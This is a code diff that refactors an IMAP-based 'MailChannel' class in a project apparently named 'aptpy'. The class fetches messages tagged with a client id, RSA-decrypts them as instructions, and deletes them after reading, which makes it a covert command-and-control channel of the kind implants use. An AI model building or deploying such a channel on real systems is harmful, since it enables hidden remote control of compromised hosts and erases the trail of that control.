@@ -19,17 +19,34 @@ class MailChannel(AbstractChannel):
         self.settings = settings
         self.connection_requested = False
         self.delimiter = "~~~~~~~~~~~~~~~~~~~~"
+        self.mailer = None
 
     def enabled(self):
+        try:
+            self.mailer = imaplib.IMAP4_SSL(self.settings['imap']['host'])
+            rv, data = self.mailer.login(self.settings['imap']['user'], self.settings['imap']['password'])
+
+            # Check the return value
+            if rv != 'OK':
+                return False
+
+            rv, data = self.mailer.select('INBOX')
+
+            if rv != 'OK':
+                return False
+        except:
+            # If anything fails, we can't use this channel
+            return False
+
         return True
 
     def connect(self):
         getLogger('aptpy').debug("[MAIL] Trying to contact the remote server")
 
-        message = self._get_emails(2)
+        messages = self._get_emails(2)
 
-        if message:
-            encrypted = message.pop().split(self.delimiter)
+        if messages:
+            encrypted = messages.pop().split(self.delimiter)
             plain = RSAdecrypt(encrypted[0], encrypted[1])
 
             if plain:
@@ -58,17 +75,14 @@ class MailChannel(AbstractChannel):
 
     def _get_emails(self, parts):
         results = []
-        mailer = imaplib.IMAP4_SSL(self.settings['imap']['host'])
-        rv, data = mailer.login(self.settings['imap']['user'], self.settings['imap']['password'])
 
-        mailer.select('INBOX')
-        (retcode, messages) = mailer.search(None, '(ALL)')
+        (retcode, messages) = self.mailer.search(None, '(ALL)')
 
         my_subject = 'R:' + b64encode(str(self.client_id))
 
         if retcode == 'OK':
             for num in messages[0].split():
-                typ, data = mailer.fetch(num, '(RFC822)')
+                typ, data = self.mailer.fetch(num, '(RFC822)')
                 original = message_from_string(data[0][1])
 
                 # Skip messages that aren't for me
@@ -83,12 +97,10 @@ class MailChannel(AbstractChannel):
 
                 if body.count(self.delimiter) == parts:
                     results.append(body)
-                    typ, data = mailer.store(num, '+FLAGS', '\\Deleted')
+                    self.mailer.store(num, '+FLAGS', '\\Deleted')
                     break
 
-        mailer.expunge()
-        mailer.close()
-        mailer.logout()
+        self.mailer.expunge()
 
         return results
 
